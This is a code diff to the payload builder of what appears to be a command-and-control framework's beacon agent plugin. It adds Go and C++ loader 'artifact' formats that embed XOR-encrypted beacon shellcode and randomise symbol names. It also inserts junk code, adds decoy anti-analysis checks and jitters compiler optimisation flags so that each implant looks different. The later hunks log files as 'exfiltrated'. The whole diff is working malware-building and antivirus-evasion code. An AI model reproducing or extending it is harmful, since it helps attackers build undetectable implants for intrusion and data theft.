@@ -326,6 +326,88 @@ func resolveLinkerLd(moduleDir string) (string, error) {
 	return "", fmt.Errorf("Linker.ld not found under %q (need src_beacon/beacon/, beacon/, or top-level Linker.ld next to agent_beacon.so)", moduleDir)
 }
 
+func resolveArtifactSource(moduleDir string, subPath string) (string, error) {
+	candidates := []string{
+		filepath.Join(moduleDir, "artifacts", subPath),
+		filepath.Join(moduleDir, subPath),
+	}
+	for _, p := range candidates {
+		abs, err := filepath.Abs(p)
+		if err == nil {
+			if st, err := os.Stat(abs); err == nil && !st.IsDir() {
+				return abs, nil
+			}
+		}
+	}
+	return "", fmt.Errorf("artifact %q not found in %q", subPath, moduleDir)
+}
+
+func resolveShellcodeBin(moduleDir string, protocol string, binName string) (string, error) {
+	ObjectDir := ""
+	if protocol == "http" {
+		ObjectDir = ObjectDir_http
+	} else if protocol == "bind_smb" {
+		ObjectDir = ObjectDir_smb
+	} else if protocol == "bind_tcp" {
+		ObjectDir = ObjectDir_tcp
+	} else if protocol == "dns" {
+		ObjectDir = ObjectDir_dns
+	}
+
+	candidates := []string{
+		filepath.Join(moduleDir, "src_beacon", ObjectDir, binName),
+		filepath.Join(moduleDir, ObjectDir, binName),
+	}
+	for _, p := range candidates {
+		abs, err := filepath.Abs(p)
+		if err == nil {
+			if st, err := os.Stat(abs); err == nil && !st.IsDir() {
+				return abs, nil
+			}
+		}
+	}
+	return "", fmt.Errorf("shellcode bin %q for protocol %q not found in %q", binName, protocol, moduleDir)
+}
+
+func generateRandomString(n int) string {
+	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+	b := make([]byte, n)
+	for i := range b {
+		b[i] = letters[rand.IntN(len(letters))]
+	}
+	return string(b)
+}
+
+func generateJunkCodeC() string {
+	junkPool := []string{
+		"int x = %d; for(int i=0; i<%d; i++) { x += i; }",
+		"if(GetTickCount() == 0xdeadbeef) { ExitProcess(0); }",
+		"void* p = VirtualAlloc(NULL, %d, MEM_COMMIT, PAGE_READWRITE); if(p) VirtualFree(p, 0, MEM_RELEASE);",
+		"char buf[%d]; memset(buf, 0x%02x, sizeof(buf));",
+		"for(int j=0; j<%d; j++) { SwitchToThread(); }",
+	}
+	
+	count := rand.IntN(3) + 2
+	var lines []string
+	for i := 0; i < count; i++ {
+		fmtStr := junkPool[rand.IntN(len(junkPool))]
+		line := fmt.Sprintf(fmtStr, rand.IntN(1000), rand.IntN(100), rand.IntN(512), rand.IntN(64), rand.IntN(255), rand.IntN(50))
+		lines = append(lines, line)
+	}
+	return strings.Join(lines, "\n    ")
+}
+
+func generateJunkFunctionsC() string {
+	var functions []string
+	count := rand.IntN(2) + 1
+	for i := 0; i < count; i++ {
+		name := "Ax_" + generateRandomString(8)
+		f := fmt.Sprintf("void %s() {\n    int a = %d; int b = %d; if(a+b == 0x1337) return;\n}", name, rand.IntN(100), rand.IntN(100))
+		functions = append(functions, f)
+	}
+	return strings.Join(functions, "\n\n")
+}
+
 var (
 	ObjectDir_http = "objects_http"
 	ObjectDir_smb  = "objects_smb"
@@ -618,6 +700,7 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		stubPath       string
 		buildPath      string
 		cmdConfig      string
+		artifactSource string
 	)
 
 	postLibs := ""
@@ -794,6 +877,18 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 				lFlags += " -Wl,-e,DllMain"
 			}
 		}
+	} else if generateConfig.Format == "Artifact Go Exe" {
+		buildPath = tempDir + "/artifact.exe"
+		Filename += ".exe"
+		artifactSource, err = resolveArtifactSource(currentDir, filepath.Join("go_exe", "main.go"))
+	} else if generateConfig.Format == "Artifact C++ Exe" {
+		buildPath = tempDir + "/artifact.exe"
+		Filename += ".exe"
+		artifactSource, err = resolveArtifactSource(currentDir, filepath.Join("c_exe", "main.cpp"))
+	} else if generateConfig.Format == "Artifact C++ DLL" {
+		buildPath = tempDir + "/artifact.dll"
+		Filename += ".dll"
+		artifactSource, err = resolveArtifactSource(currentDir, filepath.Join("c_dll", "main.cpp"))
 	} else {
 		_ = os.RemoveAll(tempDir)
 		return nil, "", errors.New("unknown file format")
@@ -861,10 +956,169 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	}
 	buildArgs = append(buildArgs, "-o", buildPath)
 
-	err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, Compiler, buildArgs...)
-	if err != nil {
-		_ = os.RemoveAll(tempDir)
-		return nil, "", err
+	if artifactSource != "" {
+		// 1. Generate unique seed and comprehensive dynamic header for Core Beacon Obfuscation
+		coreSeed := fmt.Sprintf("0x%x", rand.Uint32())
+		
+		symbols := []string{
+			"AgentMain", "AgentExit", "ApiLoad", "Agent_Create", "Agent_Initialize", 
+			"Agent_BuildBeat", "Agent_IsActive", "Agent_GetWorkingSleep", "Agent_SetSessionKey",
+			"Boffer_Initialize", "Boffer_ProcessAsyncBofs", "Downloader_ProcessDownloader",
+			"JobsController_ProcessJobs", "Proxyfire_ProcessTunnels", "Pivotter_ProcessPivots",
+			"Commander_ProcessCommandTasks", "Packer_Create", "Packer_Destroy", "Packer_Pack32",
+			"Packer_data", "Packer_datasize", "Packer_Clear", "MemAllocLocal", "MemFreeLocal",
+		}
+
+		var header strings.Builder
+		header.WriteString("#pragma once\n")
+		header.WriteString(fmt.Sprintf("// Seed: %s\n\n", coreSeed))
+		
+		// Symbol Obfuscation
+		for _, sym := range symbols {
+			header.WriteString(fmt.Sprintf("#define %s Ax_%s\n", sym, generateRandomString(12)))
+		}
+
+		// Junk Macros
+		header.WriteString("\n// Junk code macros\n")
+		junkSnippets := []string{
+			"int _a = %d; int _b = %d; if(_a + _b == 0x999) return 0;",
+			"for(int _i=0; _i<%d; _i++) { __asm__(\"nop\"); }",
+			"if(GetTickCount() == 0x1337BEEF) { ExitProcess(1); }",
+		}
+		for i := 1; i <= 5; i++ {
+			snippet := junkSnippets[rand.IntN(len(junkSnippets))]
+			header.WriteString(fmt.Sprintf("#define AX_JUNK_%d %s\n", i, fmt.Sprintf(snippet, rand.IntN(1000))))
+		}
+
+		junkHeaderPath := filepath.Join(currentDir, "src_beacon", "beacon", "DynamicPolymorphism.h")
+		if err := os.MkdirAll(filepath.Dir(junkHeaderPath), 0755); err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", fmt.Errorf("failed to create core polymorphism directory: %w", err)
+		}
+		if err := os.WriteFile(junkHeaderPath, []byte(header.String()), 0600); err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", fmt.Errorf("failed to write core polymorphism header: %w", err)
+		}
+
+		// 2. Force re-compilation of MainAgent.cpp by touching it
+		mainAgentPath := filepath.Join(currentDir, "src_beacon", "beacon", "MainAgent.cpp")
+		now := time.Now()
+		if err := os.Chtimes(mainAgentPath, now, now); err != nil {
+			// Non-critical, but good to have
+		}
+
+		// 3. Compile the core beacon as raw shellcode bin with the unique SEED
+		makeBin := "bin_x64"
+		if generateConfig.Arch == "x86" {
+			makeBin = "bin_x86"
+		}
+		
+		err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "make", "-C", "src_beacon", makeBin, "SEED="+coreSeed)
+		if err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", fmt.Errorf("failed to generate polymorphic beacon shellcode (Seed: %s): %w", coreSeed, err)
+		}
+		
+		// Read the generated bin
+		binName := "beacon_http.x64.bin"
+		if generateConfig.Arch == "x86" {
+			binName = "beacon_http.x86.bin"
+		}
+		binPath, err := resolveShellcodeBin(currentDir, protocol, binName)
+		if err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", err
+		}
+		rawShellcode, err := os.ReadFile(binPath)
+		if err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", fmt.Errorf("failed to read shellcode bin: %w", err)
+		}
+		
+		// XOR encrypt shellcode for loader
+		xorKey := byte(rand.Uint32())
+		for i := 0; i < len(rawShellcode); i++ {
+			rawShellcode[i] ^= xorKey
+		}
+		
+		// Format shellcode as hex for Go template
+		var hexBuffer strings.Builder
+		for i, b := range rawShellcode {
+			hexBuffer.WriteString(fmt.Sprintf("0x%02x", b))
+			if i < len(rawShellcode)-1 {
+				hexBuffer.WriteString(", ")
+			}
+		}
+		
+		// Read and process template
+		tmplContent, err := os.ReadFile(artifactSource)
+		if err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", err
+		}
+		
+		isGoArtifact := strings.HasSuffix(artifactSource, ".go")
+		
+		processed := strings.ReplaceAll(string(tmplContent), "{{.Shellcode}}", hexBuffer.String())
+		processed = strings.ReplaceAll(processed, "{{.XorKey}}", fmt.Sprintf("0x%02x", xorKey))
+		
+		// Symbol and Code Polymorphism
+		processed = strings.ReplaceAll(processed, "{{.VarShellcode}}", generateRandomString(rand.IntN(5)+8))
+		processed = strings.ReplaceAll(processed, "{{.VarKey}}", generateRandomString(rand.IntN(5)+8))
+		processed = strings.ReplaceAll(processed, "{{.VarAddr}}", generateRandomString(rand.IntN(5)+8))
+		processed = strings.ReplaceAll(processed, "{{.VarThread}}", generateRandomString(rand.IntN(5)+8))
+		processed = strings.ReplaceAll(processed, "{{.FuncExec}}", "Ax_"+generateRandomString(10))
+		
+		if !isGoArtifact {
+			processed = strings.ReplaceAll(processed, "{{.JunkCode}}", generateJunkCodeC())
+			processed = strings.ReplaceAll(processed, "{{.JunkFunctions}}", generateJunkFunctionsC())
+		}
+		
+		tempSource := tempDir + "/main.go"
+		if !isGoArtifact {
+			tempSource = tempDir + "/main.cpp"
+		}
+		
+		if err := os.WriteFile(tempSource, []byte(processed), 0600); err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", err
+		}
+		
+		// Compile Artifact
+		if isGoArtifact {
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling Go artifact...")
+			err = Ts.TsAgentBuildExecute(profile.BuilderId, tempDir, "go", "build", "-trimpath", "-ldflags", "-s -w -H=windowsgui", "-o", buildPath, "main.go")
+		} else {
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling C++ artifact...")
+			
+			// Compiler Flag Jitter (Randomize optimization level)
+			optFlags := []string{"-Os", "-O1", "-O2", "-O3"}
+			selectedOpt := optFlags[rand.IntN(len(optFlags))]
+			
+			isDll := strings.Contains(generateConfig.Format, "DLL")
+			artifactArgs := []string{targetFlag}
+			if isDll {
+				artifactArgs = append(artifactArgs, "-shared")
+			} else {
+				artifactArgs = append(artifactArgs, "-mwindows") 
+			}
+			artifactArgs = append(artifactArgs, selectedOpt, "-s", "-o", buildPath, "main.cpp", "-luser32", "-lkernel32")
+			
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Optimization: %s", selectedOpt))
+			err = Ts.TsAgentBuildExecute(profile.BuilderId, tempDir, Compiler, artifactArgs...)
+		}
+
+		if err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", fmt.Errorf("artifact build failed: %w", err)
+		}
+		
+	} else {
+		err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, Compiler, buildArgs...)
+		if err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", err
+		}
 	}
 
 	var objcopyBin string
@@ -2004,7 +2258,11 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 				data := packer.ParseBytes()
 				fileId := fmt.Sprintf("%08x", rand.Uint32())
 
+				_ = Ts.TsDownloadAdd(agentData.Id, fileId, filename, int64(len(data)))
 				_ = Ts.TsDownloadSave(agentData.Id, fileId, filename, data)
+				
+				Ts.TsAgentConsoleOutput(agentData.Id, adaptix.MESSAGE_SUCCESS, "pillager_bridge", 
+					fmt.Sprintf("[+] File exfiltrated: %s (%v bytes)", filename, len(data)), true)
 
 			} else {
 				if false == packer.CheckPacker([]string{"array"}) {
